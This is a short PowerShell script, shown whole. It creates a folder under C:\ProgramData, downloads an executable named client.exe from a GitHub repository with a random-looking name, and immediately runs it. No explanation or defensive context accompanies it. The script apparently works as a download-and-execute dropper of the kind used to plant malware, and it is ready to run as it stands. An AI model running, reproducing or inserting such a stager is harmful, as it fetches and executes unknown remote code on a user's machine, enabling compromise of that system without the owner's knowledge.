mkdir C:\ProgramData\TCPMSG
$source = 'https://raw.githubusercontent.com/RedTheMenace/werwetfgawsergw345w3tserghwe/main/client.exe'
$destination = 'C:\ProgramData\TCPMSG\client.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
Start-Process C:\ProgramData\TCPMSG\client.exe
exit
